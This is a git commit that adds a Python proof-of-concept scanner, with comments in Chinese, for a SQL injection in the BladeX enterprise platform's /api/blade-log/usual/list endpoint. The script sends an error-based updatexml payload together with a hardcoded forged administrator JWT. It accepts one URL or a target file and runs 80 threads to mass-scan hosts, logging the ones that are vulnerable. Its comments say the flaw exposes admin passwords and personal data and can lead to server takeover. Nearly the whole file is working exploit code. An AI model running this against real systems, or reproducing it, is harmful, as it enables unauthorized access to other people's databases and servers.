1106af019f8f2e131456d2f4a8765e87f388f986
Kucei <148924637+Kucei@users.noreply.github.com>
2024-08-07 17:31:29 +0800

    Add files via upload

---
+++ BladeX企业级开发平台_usual_list_sql.py
@@ -0,0 +1,71 @@
+# BladeX企业级开发平台 usual/list SQL 注入漏洞
+# body="https://bladex.vip"
+# 产品简介:BladeX是一款精心设计的微服务架构，提供 SpringCloud 全套解决方案，开源中国首批完美集成 SpringCloud Alibaba 系列组件的微服务架构，基于稳定生产的商业项目升级优化而来，更加贴近企业级的需求，追求企业开发更加高效。
+# 漏洞概述:BladeX企业级开发平台 usual/list 存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+import requests,argparse,sys
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test = """
+\x1b[38m██████╗ ██╗      █████╗ ██████╗ ███████╗██╗  ██╗     ███████╗ ██████╗ ██╗     
+\x1b[36m██╔══██╗██║     ██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝     ██╔════╝██╔═══██╗██║     
+\x1b[34m██████╔╝██║     ███████║██║  ██║█████╗   ╚███╔╝█████╗███████╗██║   ██║██║     
+\x1b[35m██╔══██╗██║     ██╔══██║██║  ██║██╔══╝   ██╔██╗╚════╝╚════██║██║▄▄ ██║██║     
+\x1b[31m██████╔╝███████╗██║  ██║██████╔╝███████╗██╔╝ ██╗     ███████║╚██████╔╝███████╗
+\x1b[33m╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+    --author:Kucei  --Version:BladeX企业级开发平台 usual/list SQL 注入漏洞
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+\x1b[0m"""
+    print(test)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser('BladeX企业级开发平台_usual_list_SQL')
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
+    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
+    args = parser.parse_args()
+
+    # 判断url/file
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list =[]
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip())
+        pool = Pool(80)
+        pool.map(poc,url_list)
+        pool.close()
+        pool.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+def poc(target):
+    url_payload = '/api/blade-log/usual/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1'
+    headers = {
+        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
+        'Blade-Auth': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ',
+        'Connection': 'close',
+    }
+    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
+    data = {}
+    try :
+        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
+        # print(response.status_code)
+        # print(response.text)
+        if response.status_code == 500 and '~root' in response.text:
+            print( f"[+] {target} 存在漏洞！\n")
+            with open('BladeX企业级开发平台_usual_list_SQL','a',encoding='utf-8')as f:
+                f.write(target+url_payload+'\n')
+                return True
+        else:
+            print("[-] 不存在漏洞！！")
+            return False
+    except Exception:
+        print(target+"站点连接异常")
+
+
+if __name__ == '__main__':
+    main()
